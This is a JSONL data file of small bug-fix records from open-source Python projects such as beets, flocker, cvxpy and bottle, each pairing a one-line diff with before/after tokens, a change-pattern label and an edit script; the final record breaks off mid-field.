{"project": "beets", "commit_sha": "58ba4b3d75ce1716a05f2ad2ae67501e6eb6d79c", "parent_sha": "0ab3426bd92c4c6994b7b8e327b8e7d68bde0181", "file_path": "beetsplug/convert.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -94,7 +94,7 @@ def convert_item(lib, dest_dir):\n \n         artpath = lib.get_album(item).artpath\n         if artpath and conf['embed']:\n-            _embed(artpath, [dest_item])\n+            _embed(artpath, [item])\n \n \n def convert_func(lib, config, opts, args):\n", "before": "_embed ( artpath , [ dest_item ] )", "after": "_embed ( artpath , [ item ] )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:dest_item\", 3, 30, 3, 39], \"item\"]]"}
{"project": "flocker", "commit_sha": "1631ff9a00303f14c5842c161f22fa509385a83c", "parent_sha": "0e439cde954f591acabe2682e05d9aa4f67cf4cf", "file_path": "admin/cleanup.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -159,7 +159,7 @@ class CleanVolumes(object):\n         for extra in config.get(\"extra-aws\", []):\n             extra_driver_config = base_ec2.copy()\n             extra_driver_config.update(extra)\n-            drivers.append(get_ec2_driver(config))\n+            drivers.append(get_ec2_driver(extra_driver_config))\n         return drivers\n \n     def _get_cloud_volumes(self, drivers):\n", "before": "drivers . append ( get_ec2_driver ( config ) )", "after": "drivers . append ( get_ec2_driver ( extra_driver_config ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:config\", 3, 43, 3, 49], \"extra_driver_config\"]]"}
{"project": "beets", "commit_sha": "8bd0633496da9038e020493cafadc333245ff02d", "parent_sha": "226a90d12a85abc2fa19efde23feacec97d7dc34", "file_path": "beetsplug/replaygain.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -471,7 +471,7 @@ class AudioToolsBackend(Backend):\n     def __init__(self, config, log):\n-        super(CommandBackend, self).__init__(config, log)\n+        super(AudioToolsBackend, self).__init__(config, log)\n         self._import_audiotools()\n \n     def _import_audiotools(self):\n", "before": "super ( CommandBackend , self ) . __init__ ( config , log )", "after": "super ( AudioToolsBackend , self ) . __init__ ( config , log )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:CommandBackend\", 1, 15, 1, 29], \"AudioToolsBackend\"]]"}
{"project": "beets", "commit_sha": "f2b74d2019a248329f232b4c646ba351165d7583", "parent_sha": "7779a5c6f5a6b62f32d688a5cfdc482513e33610", "file_path": "beetsplug/rewrite.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ def rewriter(field, rules):\n \n class RewritePlugin(BeetsPlugin):\n     def __init__(self):\n-        super(BeetsPlugin, self).__init__()\n+        super(RewritePlugin, self).__init__()\n         BeetsPlugin.template_fields = {}\n \n         self.config.add({})\n", "before": "super ( BeetsPlugin , self ) . __init__ ( )", "after": "super ( RewritePlugin , self ) . __init__ ( )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:BeetsPlugin\", 3, 15, 3, 26], \"RewritePlugin\"]]"}
{"project": "morpion_aveugle_EA", "commit_sha": "655c4ddfbdadaab28f5fd39dee99d0921e7a1076", "parent_sha": "1abea650d1572cde0e8aae243673a436baa323a5", "file_path": "main_reseau.py", "project_url": "https://github.com/Apodeus/morpion_aveugle_EA", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -406,7 +406,7 @@ def main_server():\n #_______________________________________FIN MAIN SERVEUR _________________________________________________________________________________\n \n def main_client(ip, port):\n-\tsocket_client = socket(AF_INET6, SOCK_STREAM)\n+\tsocket_client = socket(AF_INET, SOCK_STREAM)\n \tsocket_client.connect((ip, port))\n \ttr = thread_r(socket_client)\n \tts = thread_s(socket_client)\n", "before": "socket_client = socket ( AF_INET6 , SOCK_STREAM )", "after": "socket_client = socket ( AF_INET , SOCK_STREAM )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:AF_INET6\", 3, 25, 3, 33], \"AF_INET\"]]"}
{"project": "PyNN", "commit_sha": "138f23dfe1df95590026e052cf73725afac76ad7", "parent_sha": "9eedc6e66ebbcdc1f095691663b80b0f76006746", "file_path": "src/nest2/__init__.py", "project_url": "https://github.com/pgleeson/PyNN", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -174,7 +174,7 @@ class Recorder(object):\n                                               Recorder.formats[self.variable],\n                                               self.population, get_time_step())\n         else:\n-            if isinstance(userfile, basestring):\n+            if isinstance(user_file, basestring):\n                 os.system('cat %s > %s' % (nest_filename, user_file))\n             elif hasattr(user_file, 'write'):\n                 nest_file = open(nest_filename)\n", "before": "if isinstance ( userfile , basestring ) : os . system ( 'cat %s > %s' % ( nest_filename , user_file ) ) elif hasattr ( user_file , 'write' ) : nest_file = open ( nest_filename )", "after": "if isinstance ( user_file , basestring ) : os . system ( 'cat %s > %s' % ( nest_filename , user_file ) ) elif hasattr ( user_file , 'write' ) : nest_file = open ( nest_filename )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:userfile\", 3, 27, 3, 35], \"user_file\"]]"}
{"project": "PyNN", "commit_sha": "210ae9d545238e8a0138b4fcddfe3539087991d1", "parent_sha": "c7ec704531440e11c99c7985072853982ccec7cb", "file_path": "src/brian/__init__.py", "project_url": "https://github.com/pgleeson/PyNN", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -255,7 +255,7 @@ class Population(common.Population):\n         useless_params=['v_thresh','v_reset','tau_refrac','cm']\n         if self.cellparams:\n             for key, value in self.cellparams.items():\n-                if not key in unchangeable_params:\n+                if not key in useless_params:\n                     setattr(self.brian_cells,key,value)\n         self.cell = numpy.array([ID(cell) for cell in xrange(len(self.brian_cells))],ID)\n         for id in self.cell:\n", "before": "if not key in unchangeable_params : setattr ( self . brian_cells , key , value )", "after": "if not key in useless_params : setattr ( self . brian_cells , key , value )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:unchangeable_params\", 3, 31, 3, 50], \"useless_params\"]]"}
{"project": "cs325_project1", "commit_sha": "0dffc1d98478aa5c36c96e7f103bcc27db182847", "parent_sha": "e4a9acc8e3ad0a4c4e202e85107cea3fb3820b16", "file_path": "project1_verFinal.py", "project_url": "https://github.com/gariepyt/cs325_project1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -208,7 +208,7 @@ def main():\n \n \t\t\t\t\t# Calc divide and conquer time\n \t\t\t\t\tstartTime = time.clock()\n-\t\t\t\t\tresult1 = max_subarray(row, 0, len(row)-1)\n+\t\t\t\t\tresult = max_subarray(row, 0, len(row)-1)\n \t\t\t\t\tstopTime = time.clock()\n \n \t\t\t\t\tresultTime = stopTime - startTime\n", "before": "result1 = max_subarray ( row , 0 , len ( row ) - 1 )", "after": "result = max_subarray ( row , 0 , len ( row ) - 1 )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:result1\", 3, 6, 3, 13], \"result\"]]"}
{"project": "django-ratings", "commit_sha": "bf83beae24ca93ad5f44a8ba4eac6e2b05a667b0", "parent_sha": "cf945431cbcceef5af08bd89821b47f67fce01b6", "file_path": "djangoratings/__init__.py", "project_url": "https://github.com/eliksir/django-ratings", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class RatingManager(object):\n                 content_type    = self.get_content_type(),\n                 object_id       = self.instance.id,\n                 user            = None,\n-                ip_addresss     = ip_address,\n+                ip_address      = ip_address,\n                 defaults        = defaults,\n             )\n         else:\n", "before": "ip_addresss = ip_address , defaults = defaults ,", "after": "ip_address = ip_address , defaults = defaults ,", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:ip_addresss\", 3, 17, 3, 28], \"ip_address\"]]"}
{"project": "django-ratings", "commit_sha": "bf4381e61d3bdb5ce0a8ba729388106e4460b399", "parent_sha": "bacb9669c2b959900ad81c557458dd0e72cbd930", "file_path": "djangoratings/views.py", "project_url": "https://github.com/eliksir/django-ratings", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,5 +86,5 @@ class AddRatingFromModel(AddRatingView):\n         except ContentType.DoesNotExist:\n             raise Http404('Invalid `model` or `app_label`.')\n         \n-        return super(AddRatingFromLabels, self).__call__(request, content_type.id,\n+        return super(AddRatingFromModel, self).__call__(request, content_type.id,\n             object_id, field_name, score)\n\\ No newline at end of file\n", "before": "return super ( AddRatingFromLabels , self ) . __call__ ( request , content_type . id , object_id , field_name , score )   No newline at end of file", "after": "return super ( AddRatingFromModel , self ) . __call__ ( request , content_type . id , object_id , field_name , score )   No newline at end of file", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:AddRatingFromLabels\", 3, 22, 3, 41], \"AddRatingFromModel\"]]"}
{"project": "weewx", "commit_sha": "866e6a5047addd69e4ad03ed545122d9a137a60e", "parent_sha": "09c4ab5b5ddd73b25851e7256fed0f131e8fa272", "file_path": "bin/weewx/drivers/ws1.py", "project_url": "https://github.com/richterb1/weewx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -177,7 +177,7 @@ class Station(object):\n         return ''.join(b)\n \n     @staticmethod\n-    def parse_readings(b):\n+    def parse_readings(buf):\n", "before": "def parse_readings ( b ) : ", "after": "def parse_readings ( buf ) : ", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:b\", 3, 24, 3, 25], \"buf\"]]"}
{"project": "django-machina", "commit_sha": "7e23405aa14e5168c4d271473ad27e44071828a6", "parent_sha": "cdf7dade74bbe2acb1f16adb5ddafc6c454fa5e0", "file_path": "machina/templatetags/forum_permission_tags.py", "project_url": "https://github.com/eliksir/django-machina", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def get_permission(context, method, user, **kwargs):\n     request = context.get('request', None)\n     perm_handler = request.forum_permission_handler if request else PermissionHandler()\n \n-    allowed_methods = inspect.getmembers(PermissionHandler, predicate=inspect.ismethod)\n+    allowed_methods = inspect.getmembers(perm_handler, predicate=inspect.ismethod)\n     allowed_method_names = [a[0] for a in allowed_methods if not a[0].startswith('_')]\n \n     if method not in allowed_method_names:\n", "before": "allowed_methods = inspect . getmembers ( PermissionHandler , predicate = inspect . ismethod )", "after": "allowed_methods = inspect . getmembers ( perm_handler , predicate = inspect . ismethod )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:PermissionHandler\", 3, 42, 3, 59], \"perm_handler\"]]"}
{"project": "larray", "commit_sha": "448d54afb82af032ca8a7516bf12af274337e6c1", "parent_sha": "add2cf5f0882129c72c1373b871a15fed3876160", "file_path": "larray/core.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -329,7 +329,7 @@ def to_ticks(s):\n-    if isinstance(s, ValueGroup):\n+    if isinstance(s, LKey):\n         # a single ValueGroup used for all ticks of an Axis\n         raise NotImplemented(\"not sure what to do with it yet\")\n     elif isinstance(s, pd.Index):\n", "before": "if isinstance ( s , ValueGroup ) : raise NotImplemented ( \"not sure what to do with it yet\" ) elif isinstance ( s , pd . Index ) : ", "after": "if isinstance ( s , LKey ) : raise NotImplemented ( \"not sure what to do with it yet\" ) elif isinstance ( s , pd . Index ) : ", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:ValueGroup\", 0, 22, 0, 32], \"LKey\"]]"}
{"project": "cvxpy", "commit_sha": "a68d539884effe82039b891daab19c052d216176", "parent_sha": "1a1603b815f435f7c44d108a2f5a0bbe779f269a", "file_path": "cvxpy/problems/objective.py", "project_url": "https://github.com/zqcr/cvxpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ class Minimize(u.Canonical):\n \n         Returns\n         -------\n-        Constraint\n+        Objective\n", "before": "- - - - - - - Constraint", "after": "- - - - - - - Objective", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:Constraint\", 3, 9, 3, 19], \"Objective\"]]"}
{"project": "cvxpy", "commit_sha": "63876dc0475b204f001cc00a39e6961a3c79a465", "parent_sha": "7000edd6ae39bb839ab95f29d6ca0e2d2e51f5b9", "file_path": "cvxpy/tests/test_solvers.py", "project_url": "https://github.com/zqcr/cvxpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -137,7 +137,7 @@ class TestSolvers(BaseTest):\n         else:\n             with self.assertRaises(Exception) as cm:\n                 prob = Problem(Minimize(norm(self.x, 1)), [self.x == 0])\n-                prob.solve(solver = GLPK)\n+                prob.solve(solver = GUROBI_LIN)\n             self.assertEqual(str(cm.exception), \"The solver %s is not installed.\" % GUROBI_LIN)\n \n     def test_installed_solvers(self):\n", "before": "prob . solve ( solver = GLPK )", "after": "prob . solve ( solver = GUROBI_LIN )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:GLPK\", 3, 37, 3, 41], \"GUROBI_LIN\"]]"}
{"project": "larray", "commit_sha": "fbec8ed9b124a6067b53286aca5562df597378c5", "parent_sha": "38e8724e53a97e5b18e23319ac59a4d1bf9b1573", "file_path": "larray/io/excel.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -259,7 +259,7 @@ if xw is not None:\n \n         Parameters\n         ----------\n-        k : slice\n+        s : slice\n             slice to replace\n         length : int\n             length of sequence\n", "before": "- - - - - - - - - - k : slice", "after": "- - - - - - - - - - s : slice", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:k\", 3, 9, 3, 10], \"s\"]]"}
{"project": "flutterfuck", "commit_sha": "8791f71976915e88ac9fe1990dbfd5294c74d96f", "parent_sha": "c3046797c7bf539660b416953003c5b5cc547d29", "file_path": "willie/web.py", "project_url": "https://github.com/CoRD-Dev/flutterfuck", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -134,7 +134,7 @@ class VerifiedHTTPSConnection(httplib.HTTPConnection):\n                 self.sock = sock\n                 self._tunnel()\n             if not  os.path.exists(ca_certs):\n-                raise Exception('CA Certifcate bundle %s is not readable' % ca_certs)\n+                raise Exception('CA Certificate bundle %s is not readable' % ca_certs)\n             self.sock = ssl.wrap_socket(sock,\n                                         ca_certs=ca_certs,\n                                         cert_reqs=ssl.CERT_REQUIRED)\n", "before": "raise Exception ( 'CA Certifcate bundle %s is not readable' % ca_certs )", "after": "raise Exception ( 'CA Certificate bundle %s is not readable' % ca_certs )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'CA Certifcate bundle %s is not readable'\", 3, 33, 3, 74], \"'CA Certificate bundle %s is not readable'\"]]"}
{"project": "cfapi", "commit_sha": "551cd338dc9f25fc23a5037d1802515328327f01", "parent_sha": "ff73697065813c6155385ecc5c3af21046a388c7", "file_path": "run_update.py", "project_url": "https://github.com/opensavannah/cfapi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -462,7 +462,7 @@ def get_issues(org_name):\n \n         # Get github issues api url\n         _, host, path, _, _, _ = urlparse(project.code_url)\n-        issues_url = 'https://api.github.com/repos' + path + '/issues'\n+        issues_url = 'https://api.github.com/repos' + path + '/issues?per_page=100'\n \n         # Ping github's api for project issues\n         got = get_github_api(issues_url, headers={'If-None-Match': project.last_updated_issues})\n", "before": "issues_url = 'https://api.github.com/repos' + path + '/issues'", "after": "issues_url = 'https://api.github.com/repos' + path + '/issues?per_page=100'", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'/issues'\", 3, 62, 3, 71], \"'/issues?per_page=100'\"]]"}
{"project": "easybuild-easyconfigs", "commit_sha": "76d57ce09da340ac1eac8fc16d051b971d7c8823", "parent_sha": "cac7c45575e5e458ab7525b23f5c2fe5dec4f36c", "file_path": "easybuild/easyblocks/d/doxygen.py", "project_url": "https://github.com/schiotz/easybuild-easyconfigs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ class Doxygen(Application):\n     def configure(self):\n         \"\"\"Configure build using non-standard configure script (see prefix option)\"\"\"\n \n-        cmd = \"%s %s./configure --prefix %s %s\" % (self.getcfg('preconfigopts'), self.installdir,\n+        cmd = \"%s ./configure --prefix %s %s\" % (self.getcfg('preconfigopts'), self.installdir,\n                                                    self.getcfg('configopts'))\n         run_cmd(cmd, log_all=True, simple=True)\n \n", "before": "cmd = \"%s %s./configure --prefix %s %s\" % ( self . getcfg ( 'preconfigopts' ) , self . installdir , self . getcfg ( 'configopts' ) )", "after": "cmd = \"%s ./configure --prefix %s %s\" % ( self . getcfg ( 'preconfigopts' ) , self . installdir , self . getcfg ( 'configopts' ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"%s %s./configure --prefix %s %s\\\"\", 3, 15, 3, 48], \"\\\"%s ./configure --prefix %s %s\\\"\"]]"}
{"project": "pokeminer", "commit_sha": "204c2156bab8e411d76fcd4bc7a820d3b61a1ad9", "parent_sha": "c9098620d8026ed0402c4c07dc61a765d7c45cfd", "file_path": "example.py", "project_url": "https://github.com/pogosandbox/pokeminer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -486,7 +486,7 @@ def main():\n             pid = str(poke.pokemon.PokemonId)\n             label = (\n                         '<div style=\\'position:float; top:0;left:0;\\'><small><a href=\\'http://www.pokemon.com/us/pokedex/'+pid+'\\' target=\\'_blank\\' title=\\'View in Pokedex\\'>#'+pid+'</a></small> - <b>'+pokemonsJSON[poke.pokemon.PokemonId - 1]['Name']+'</b></div>'\n-                        '<center class=\"label-countdown\" data-disappears-at=\"'+ str(disappear_timestamp)+'\">'+disappears_at+'</center>'\n+                        '<center class=\\'label-countdown\\' data-disappears-at=\\''+ str(disappear_timestamp)+'\\'>'+disappears_at+'</center>'\n                     )\n             if args.china:\n                 poke.Latitude, poke.Longitude = transform_from_wgs_to_gcj(Location(poke.Latitude, poke.Longitude))\n", "before": "label = ( '<div style=\\'position:float; top:0;left:0;\\'><small><a href=\\'http://www.pokemon.com/us/pokedex/' + pid + '\\' target=\\'_blank\\' title=\\'View in Pokedex\\'>#' + pid + '</a></small> - <b>' + pokemonsJSON [ poke . pokemon . PokemonId - 1 ] [ 'Name' ] + '</b></div>' '<center class=\"label-countdown\" data-disappears-at=\"' + str ( disappear_timestamp ) + '\">' + disappears_at + '</center>' )", "after": "label = ( '<div style=\\'position:float; top:0;left:0;\\'><small><a href=\\'http://www.pokemon.com/us/pokedex/' + pid + '\\' target=\\'_blank\\' title=\\'View in Pokedex\\'>#' + pid + '</a></small> - <b>' + pokemonsJSON [ poke . pokemon . PokemonId - 1 ] [ 'Name' ] + '</b></div>' '<center class=\\'label-countdown\\' data-disappears-at=\\'' + str ( disappear_timestamp ) + '\\'>' + disappears_at + '</center>' )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'\\\">'\", 3, 106, 3, 110], \"'\\\\'>'\"], [\"Update\", [\"string:'<center class=\\\"label-countdown\\\" data-disappears-at=\\\"'\", 3, 25, 3, 79], \"'<center class=\\\\'label-countdown\\\\' data-disappears-at=\\\\''\"]]"}
{"project": "pokeminer", "commit_sha": "b0cddf90d19e35b15a9358ccdb7658ffd9a40032", "parent_sha": "ddf012fd844ab1193377422ad6dd8495bbc24f76", "file_path": "example.py", "project_url": "https://github.com/pogosandbox/pokeminer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -506,7 +506,7 @@ def main():\n             pid = str(poke.pokemon.PokemonId)\n             label = (\n                         '<div style=\\'position:float; top:0;left:0;\\'><small><a href=\\'http://www.pokemon.com/us/pokedex/'+pid+'\\' target=\\'_blank\\' title=\\'View in Pokedex\\'>#'+pid+'</a></small> - <b>'+pokemonsJSON[poke.pokemon.PokemonId - 1]['Name']+'</b></div>'\n-                        '<center class=\"label-countdown\" data-disappears-at=\"'+disappear_timestamp+'\">'+disappears_at+'</center>'\n+                        '<center class=\\'label-countdown\\' data-disappears-at=\\''+ str(disappear_timestamp)+'\\'>'+disappears_at+'</center>'\n                     )\n             if args.china:\n                 poke.Latitude, poke.Longitude = transform_from_wgs_to_gcj(Location(poke.Latitude, poke.Longitude))\n", "before": "label = ( '<div style=\\'position:float; top:0;left:0;\\'><small><a href=\\'http://www.pokemon.com/us/pokedex/' + pid + '\\' target=\\'_blank\\' title=\\'View in Pokedex\\'>#' + pid + '</a></small> - <b>' + pokemonsJSON [ poke . pokemon . PokemonId - 1 ] [ 'Name' ] + '</b></div>' '<center class=\"label-countdown\" data-disappears-at=\"' + disappear_timestamp + '\">' + disappears_at + '</center>' )", "after": "label = ( '<div style=\\'position:float; top:0;left:0;\\'><small><a href=\\'http://www.pokemon.com/us/pokedex/' + pid + '\\' target=\\'_blank\\' title=\\'View in Pokedex\\'>#' + pid + '</a></small> - <b>' + pokemonsJSON [ poke . pokemon . PokemonId - 1 ] [ 'Name' ] + '</b></div>' '<center class=\\'label-countdown\\' data-disappears-at=\\'' + str ( disappear_timestamp ) + '\\'>' + disappears_at + '</center>' )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'\\\">'\", 3, 100, 3, 104], \"'\\\\'>'\"], [\"Insert\", [\"binary_operator\", 2, 25, 3, 99], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Update\", [\"string:'<center class=\\\"label-countdown\\\" data-disappears-at=\\\"'\", 3, 25, 3, 79], \"'<center class=\\\\'label-countdown\\\\' data-disappears-at=\\\\''\"], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:disappear_timestamp\", 3, 80, 3, 99], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cclib", "commit_sha": "5f9006d293be67365a8a33416449e1324cb7f37d", "parent_sha": "0e3f26f95a399bafa4cdc61ef270ca96e9b4d7ff", "file_path": "src/cclib/method/fragments.py", "project_url": "https://github.com/chemistry-scripts/cclib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ class FragmentAnalysis(Method):\n         \n     def __str__(self):\n         \"\"\"Return a string representation of the object.\"\"\"\n-        return \"Fragment molecule basis of\" % (self.data)\n+        return \"Fragment molecule basis of %s\" % (self.data)\n \n     def __repr__(self):\n         \"\"\"Return a representation of the object.\"\"\"\n", "before": "return \"Fragment molecule basis of\" % ( self . data )", "after": "return \"Fragment molecule basis of %s\" % ( self . data )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Fragment molecule basis of\\\"\", 3, 16, 3, 44], \"\\\"Fragment molecule basis of %s\\\"\"]]"}
{"project": "kle_render", "commit_sha": "d435e710173195214328b609aa10bfeed54b4056", "parent_sha": "0a16413cfc3d87235675966d07388b3b23e44499", "file_path": "key.py", "project_url": "https://github.com/CQCumbers/kle_render", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -215,7 +215,7 @@ class Key(object):\n             c = tuple(band + 0x26 for band in c) # Simulates reflectivity \n \n             if self.align == -1: # if not explicitly aligned\n-                if not self.profile.startswith(GMK_LABELS) and not self.decal and len(labels) <= 2 and labels[0] != '': # If 2 or fewer labels and not explicitly aligned, align accurately depending on profile\n+                if not self.profile.startswith(GMK_LABELS) and not self.decal and len(labels) == 1 and labels[0] != '': # If single label and not explicitly aligned, center align SA profile\n                     self.align = 7\n                 else:\n                     self.align = 0\n", "before": "if not self . profile . startswith ( GMK_LABELS ) and not self . decal and len ( labels ) <= 2 and labels [ 0 ] != '' : self . align = 7 else : self . align = 0", "after": "if not self . profile . startswith ( GMK_LABELS ) and not self . decal and len ( labels ) == 1 and labels [ 0 ] != '' : self . align = 7 else : self . align = 0", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 83, 3, 99], [\"==:==\", \"T\"], 1], [\"Update\", [\"integer:2\", 3, 98, 3, 99], \"1\"], [\"Delete\", [\"<=:<=\", 3, 95, 3, 97]]]"}
{"project": "burp_server_reports", "commit_sha": "9514173b6e4bd85efdf4324a5a0331172d5a8fd0", "parent_sha": "f268df32857fe07590a4f61db0ce17b038bd14b6", "file_path": "burp_reports/lib/imap.py", "project_url": "https://github.com/pablodav/burp_server_reports", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ class ImapReceive:\n         self.host = config['imap_host']\r\n         self.user = config['imap_user']\r\n         self.password = config['imap_password']\r\n-        self.imap_folder = config['imap_folder'] or '.'\r\n+        self.imap_folder = config['imap_folder'] or 'INBOX'\r\n         self.imap_search = config['imap_search'] or 'TODAY'\r\n         self.imap_port = config['imap_port'] or '993'\r\n         self.save_directory = config['attachment_save_directory'] or '.'\r\n", "before": "self . imap_folder = config [ 'imap_folder' ] or '.'", "after": "self . imap_folder = config [ 'imap_folder' ] or 'INBOX'", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'.'\", 3, 53, 3, 56], \"'INBOX'\"]]"}
{"project": "bottle", "commit_sha": "feb447b5a528671b2f1c6868657302c83f9afdfc", "parent_sha": "b4b6af244fbd0831ee22b533295c4a492c14abfa", "file_path": "test/test_sendfile.py", "project_url": "https://github.com/mrdon/bottle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class TestSendFile(unittest.TestCase):\n         \"\"\" SendFile: Download as attachment \"\"\"\n         basename = os.path.basename(__file__)\n         f = static_file(basename, root='./', download=True)\n-        self.assertEqual('attachment; filename=%s' % basename, f.header['Content-Disposition'])\n+        self.assertEqual('attachment; filename=\"%s\"' % basename, f.header['Content-Disposition'])\n         request.environ['HTTP_IF_MODIFIED_SINCE'] = time.strftime(\"%a, %d %b %Y %H:%M:%S GMT\", time.gmtime(100))\n         f = static_file(os.path.basename(__file__), root='./')\n         self.assertEqual(open(__file__,'rb').read(), f.output.read())\n", "before": "self . assertEqual ( 'attachment; filename=%s' % basename , f . header [ 'Content-Disposition' ] )", "after": "self . assertEqual ( 'attachment; filename=\"%s\"' % basename , f . header [ 'Content-Disposition' ] )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'attachment; filename=%s'\", 3, 26, 3, 51], \"'attachment; filename=\\\"%s\\\"'\"]]"}
{"project": "nci-webtools-dceg-linkage", "commit_sha": "d31b4dbf79c0b1b0b3b0da959e522cb23e040b54", "parent_sha": "950ac1139a8b14278d0cbd3fab96ec8aeb8e0c50", "file_path": "LDlink/LDlink.py", "project_url": "https://github.com/CBIIT/nci-webtools-dceg-linkage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -129,7 +129,7 @@ def requires_token(f):\n         elif env == 'prod':\n             url_root = 'https://ldlink.nci.nih.gov/'\n         else:\n-            url_root = 'https://ldlink' + env + '.nci.nih.gov/'\n+            url_root = 'https://ldlink-' + env + '.nci.nih.gov/'\n         require_token = bool(config['api']['require_token'])\n         token_expiration = bool(config['api']['token_expiration'])\n         token_expiration_days = config['api']['token_expiration_days']\n", "before": "else : url_root = 'https://ldlink' + env + '.nci.nih.gov/'", "after": "else : url_root = 'https://ldlink-' + env + '.nci.nih.gov/'", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'https://ldlink'\", 3, 24, 3, 40], \"'https://ldlink-'\"]]"}
{"project": "course-management", "commit_sha": "6a11cd94da076a71eace0ff8dc0ad739683f31e2", "parent_sha": "e452cff4d1d5271b4295fadc3f23a0df10732db2", "file_path": "user/views/register.py", "project_url": "https://github.com/fsr/course-management", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -105,7 +105,7 @@ def verification_mail(user, type_, email):\n     type_val = ACTIVATION_TYPES[type_]\n \n     user_token = generateToken()\n-    if type_ == 'student' and user.userinformation.is_pending_student():\n+    if type_ == 'student' and len(Activation.objects.filter(user=user, type=type_val)) > 0:\n         Activation.objects.get(user=user, type=type_val).delete()\n \n     Activation.objects.create(user=user, token=user_token, type=type_val)\n", "before": "if type_ == 'student' and user . userinformation . is_pending_student ( ) : Activation . objects . get ( user = user , type = type_val ) . delete ( )", "after": "if type_ == 'student' and len ( Activation . objects . filter ( user = user , type = type_val ) ) > 0 : Activation . objects . get ( user = user , type = type_val ) . delete ( )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 72], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\">:>\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"call\", 3, 31, 3, 72], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Update\", 